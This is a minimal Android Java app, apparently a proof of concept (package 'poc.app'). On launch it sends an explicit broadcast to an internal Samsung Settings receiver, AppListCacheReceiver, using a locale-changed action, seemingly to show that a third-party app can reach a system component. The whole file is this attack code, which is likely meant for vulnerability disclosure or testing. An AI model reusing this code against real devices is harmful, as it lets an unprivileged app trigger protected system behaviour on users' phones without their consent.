package poc.app;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;

public class MainActivity extends Activity {
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        Intent i = new Intent("com.samsung.android.settings.intent.action.LOCALE_CHANGED");
        i.setClassName("com.android.settings", "com.samsung.android.settings.applications.cachedb.AppListCacheReceiver");
        sendBroadcast(i);
    }
}